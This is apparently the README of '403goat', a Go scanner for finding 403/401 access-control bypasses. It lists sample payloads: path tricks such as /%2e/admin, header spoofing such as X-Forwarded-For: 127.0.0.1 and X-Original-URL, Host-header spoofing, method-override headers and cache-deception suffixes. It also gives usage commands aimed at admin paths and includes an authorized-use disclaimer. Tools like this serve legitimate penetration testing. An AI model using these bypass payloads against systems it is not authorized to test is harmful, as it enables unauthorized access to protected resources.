# 🐐 403goat

<p align="center">
  <img src="https://img.shields.io/badge/Go-1.21+-00ADD8?style=for-the-badge&logo=go" alt="Go Version"/>
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License"/>
  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-blue?style=for-the-badge" alt="Platform"/>
  <img src="https://img.shields.io/badge/Version-2.0.0-red?style=for-the-badge" alt="Version"/>
</p>

<p align="center">
  <b>🔥 Advanced 403/401 Bypass Tool for Security Researchers 🔥</b>
</p>

---

**403goat** is a high-performance, professional-grade tool designed to automate the discovery of 403 Forbidden and 401 Unauthorized bypass vulnerabilities. It systematically tests **10+ bypass categories** including path manipulations, HTTP methods, header injections, host header attacks, cache deception, and more.

## ✨ Features

### Core Bypass Techniques

| Technique | Description | Payloads |
|-----------|-------------|----------|
| 🔀 **Path Fuzzing** | URL path variations with prefixes/suffixes | 180+ |
| 📨 **Method Fuzzing** | HTTP verb tampering (GET, POST, PUT, DELETE, OPTIONS, HEAD) | 6 |
| 🎭 **Header Injection** | Bypass headers (X-Forwarded-For, X-Original-URL, etc.) | 620+ |
| 🔤 **Unicode Bypass** | Unicode encoded path traversal (`%c0%af`, `%ef%bc%8f`) | 15 |
| 🔠 **Case Manipulation** | Case variations (`/Admin`, `/ADMIN`, `/aDmIn`) | Dynamic |
| 🔄 **Double Encoding** | Double URL encoding (`%252e`, `%252f`) | 10 |

### Advanced Bypass Techniques (NEW!)

| Technique | Description | Payloads |
|-----------|-------------|----------|
| 🌐 **Host Header Attacks** | Localhost/internal IP spoofing via Host header | 12 |
| 🔧 **Method Override** | X-HTTP-Method-Override, X-Method-Override headers | 35 |
| 📝 **Content-Type Manipulation** | JSON, XML, form-data Content-Type fuzzing | 9 |
| 📥 **Accept Header Tricks** | Accept header manipulation for format bypass | 9 |
| 💾 **Cache Deception** | Static file extension appending (.css, .js, .png) | 14 |
| 🛤️ **Path Normalization** | Tab, null, backslash, semicolon injection | 43 |

### Tool Features

| Feature | Description |
|---------|-------------|
| 📄 **Request File Support** | Load raw HTTP requests from Burp Suite or Caido |
| 🔌 **Proxy Support** | Route traffic through Burp Suite, OWASP ZAP |
| ⚡ **High Performance** | Concurrent scanning with configurable threads |
| 📊 **Advanced Filtering** | Filter by status code, response size, or regex |
| 📁 **Multiple URL Scan** | Scan multiple URLs from a file |
| 📝 **Custom Wordlist** | Use your own wordlist for path fuzzing |

## 📦 Installation

### One-Line Install (Linux/macOS)

```bash
git clone https://github.com/Serdar715/403goat.git && cd 403goat && go build -o 403goat . && sudo mv 403goat /usr/local/bin/
```

### Windows

```powershell
git clone https://github.com/Serdar715/403goat.git
cd 403goat
go build -o 403goat.exe .
```

### Go Install

```bash
go install github.com/Serdar715/403goat@latest
```

## 🚀 Usage

### Basic Scan

```bash
403goat -u https://target.com/admin
```

### With Proxy (Burp Suite)

```bash
403goat -u https://target.com/admin -proxy http://127.0.0.1:8080
```

### Using Request File (Burp/Caido Export)

```bash
403goat -r request.txt
```

### Enable All Bypass Techniques

```bash
403goat -u https://target.com/admin -unicode -case -double-encode
```

### Custom Headers

```bash
403goat -u https://target.com/admin -H "Cookie: session=abc123" -H "Authorization: Bearer token"
```

### Multiple URL Scan

```bash
403goat -l urls.txt -threads 25
```

### Filter & Match Options

```bash
# Only show 200 responses
403goat -u https://target.com/admin -mc 200

# Filter out 403 and 404
403goat -u https://target.com/admin -fc 403,404

# Filter by response size
403goat -u https://target.com/admin -fs 1234

# Match regex in response
403goat -u https://target.com/admin -mr "Welcome|Dashboard"
```

### Rate Limiting

```bash
403goat -u https://target.com/admin -rate 100
```

## ⚙️ Options

| Flag | Description | Default |
|------|-------------|---------|
| `-u` | Target URL | - |
| `-r` | Load raw HTTP request from file | - |
| `-l` | File containing list of URLs to scan | - |
| `-w` | Custom wordlist file for paths | - |
| `-H` | Custom header (can be used multiple times) | - |
| `-threads` | Number of concurrent threads | 15 |
| `-delay` | Delay between requests (ms) | 50 |
| `-timeout` | Request timeout (seconds) | 10 |
| `-rate` | Rate limit (requests/second) | 0 (unlimited) |
| `-proxy` | HTTP/HTTPS proxy URL | - |
| `-fc` | Filter status codes (comma-separated) | - |
| `-mc` | Match status codes (comma-separated) | - |
| `-fs` | Filter response size | - |
| `-mr` | Match regex in response body | - |
| `-unicode` | Enable Unicode bypass payloads | false |
| `-case` | Enable case manipulation payloads | false |
| `-double-encode` | Enable double URL encoding | false |
| `-o` | Output file path | results.json |
| `-json` | Enable JSON output format | false |
| `-v` | Verbose level (0, 1, 2) | 0 |

## 🔬 Bypass Techniques Explained

### 1. Path Fuzzing
Modifies the URL path with known bypass patterns:
```
/%2e/admin, /./admin, //admin, /admin/..;/
/../admin, /%00/admin, /admin%20, /admin%09
```

### 2. Method Fuzzing
Tests the endpoint with different HTTP verbs:
```
POST /admin, PUT /admin, DELETE /admin
OPTIONS /admin, HEAD /admin
```

### 3. Header Injection
Adds bypass headers one at a time:
```
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
X-Custom-IP-Authorization: localhost
X-Rewrite-URL: /admin
```

### 4. Host Header Attacks ⭐ NEW
Spoofs the Host header with internal IPs:
```
Host: localhost
Host: 127.0.0.1
Host: [::1]
Host: 0.0.0.0
```

### 5. Method Override ⭐ NEW
Uses override headers to change effective method:
```
X-HTTP-Method-Override: GET
X-Method-Override: PUT
X-HTTP-Method: DELETE
```

### 6. Cache Deception ⭐ NEW
Appends static file extensions for cache poisoning:
```
/admin/style.css
/admin/test.js
/admin/logo.png
```

### 7. Path Normalization ⭐ NEW
Tests special characters for path bypass:
```
/admin%00, /admin%09, /admin;
/admin#, /admin?, /admin\
```

### 8. Content-Type Manipulation ⭐ NEW
Changes Content-Type header:
```
Content-Type: application/json
Content-Type: application/xml
Content-Type: text/plain
```

## 📋 Example Output

```
  _  _    ___  ____                   _   
 | || |  / _ \|___ \                 | |  
 | || |_| | | | __) |_ _  ___   __ _ | |_ 
 |__   _| |_| ||__ <| _ |/ _ \ / _' || __|
    | |   \___/ ___) | (_| (_) | (_| || |_ 
    |_|        |____/ \__, |\___/ \__,_| \__|
                       __/ |                  
                      |___/                   

    403 Bypass Tool - 403goat
    v2.0.0 - Professional Edition

[INFO] Scan Configuration:
[INFO]   ├─ Path Payloads: 180
[INFO]   ├─ HTTP Methods: 6
[INFO]   ├─ Header Tests: 620
[INFO]   ├─ Method Override: 35
[INFO]   ├─ Host Header: 12
[INFO]   ├─ Content-Type: 9
[INFO]   ├─ Accept Header: 9
[INFO]   ├─ Cache Deception: 14
[INFO]   ├─ Path Normalization: 43
[INFO]   └─ Total Requests: 928
----------------------------------------------------------------
[200] GET /%2e/admin [path] - https://target.com/%2e/admin
[200] GET /admin [header:X-Forwarded-For=127.0.0.1] - https://target.com/admin
[200] GET /admin [host-header:localhost] - https://target.com/admin
[301] GET /admin [path] - https://target.com/admin -> [200] https://target.com/dashboard
----------------------------------------------------------------
[SUCCESS] Scan completed. Potential bypasses found!
```

## 🆚 Comparison with Other Tools

| Feature | 403goat | byp4xx | 403bypasser | 4-Zero-3 |
|---------|---------|--------|-------------|----------|
| Path Fuzzing | ✅ 180+ | ✅ ~50 | ✅ ~30 | ✅ ~40 |
| Header Injection | ✅ 38 | ✅ ~20 | ✅ ~15 | ✅ ~25 |
| Unicode Bypass | ✅ | ❌ | ❌ | ⚠️ |
| Host Header Attack | ✅ | ❌ | ❌ | ❌ |
| Method Override | ✅ | ❌ | ❌ | ❌ |
| Cache Deception | ✅ | ❌ | ❌ | ❌ |
| Path Normalization | ✅ | ❌ | ❌ | ❌ |
| Request File | ✅ | ❌ | ❌ | ❌ |
| Proxy Support | ✅ | ✅ | ❌ | ✅ |
| Language | Go 🚀 | Python | Python | Bash |

## 🛡️ Disclaimer

This tool is intended for **authorized security testing** and **educational purposes only**.

- ✅ Use on systems you own or have explicit written permission to test
- ❌ Do NOT use on systems without authorization
- ⚖️ The author is not responsible for any misuse of this tool

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 📝 Changelog

### v2.0.0 (2024-12-15)
- ✨ Added Host Header Attacks (12 payloads)
- ✨ Added Method Override Headers (35 combinations)
- ✨ Added Content-Type Manipulation (9 payloads)
- ✨ Added Accept Header Tricks (9 payloads)
- ✨ Added Cache Deception (14 payloads)
- ✨ Added Path Normalization (43 payloads)
- 🔧 Improved scan configuration display
- 📚 Updated documentation

### v1.0.0
- Initial release with core bypass techniques

---

<p align="center">
  <b>Made with 🐐 by <a href="https://github.com/Serdar715">Serdar715</a></b>
</p>

<p align="center">
  <a href="https://github.com/Serdar715/403goat/stargazers">⭐ Star this repo if you find it useful!</a>
</p>
